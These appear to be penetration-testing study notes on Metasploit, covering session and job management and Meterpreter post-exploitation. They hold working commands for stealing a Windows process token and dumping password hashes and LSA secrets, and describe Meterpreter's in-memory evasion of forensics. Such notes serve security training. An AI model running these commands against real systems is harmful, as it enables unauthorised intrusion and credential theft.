#### Background
Sessions can be put in the background with `[CTRL] + [Z]` or the `background` command
#### Interact with Session
```bash
msf6 exploit(multi/handler) > sessions
msf6 exploit(multi/handler) > sessions -i 1
```
#### Jobs
If we are running an active exploit under a specific port and need this port for a different module, we cannot simply terminate the session using `[CTRL] + [C]`. If we did that, we would see that the port would still be in use, affecting our use of the new module. So instead, we would need to use the `jobs` command to look at the currently active tasks running in the background and terminate the old ones to free up the port.
```bash
msf6 exploit(multi/handler) > jobs -h
```
#### Running an Exploit as a Background Job
```bash
msf6 exploit(multi/handler) > exploit -j
```
#### Listing Jobs
```bash
msf6 exploit(multi/handler) > jobs -l
```

# Meterpreter
The main idea we need to get about Meterpreter is that it is just as good as getting a direct shell on the target OS but with more functionality. 

The extensible Payload uses `DLL injection` to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.
#### Meterpreter Migration
```shell
meterpreter > getuid

[-] 1055: Operation failed: Access is denied.

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
<SNIP>
 1836  592   wmiprvse.exe      x86   0   NT AUTHORITY\NETWORK SERVICE   C:\WINDOWS\system32\wbem\wmiprvse.exe

meterpreter > steal_token 1836

Stolen token with username: NT AUTHORITY\NETWORK SERVICE

meterpreter > getuid

Server username: NT AUTHORITY\NETWORK SERVICE
```
#### Local Exploit Suggester
```
meterpreter > bg
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
```
#### Dumping Hashes
```
meterpreter > hashdump
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets
```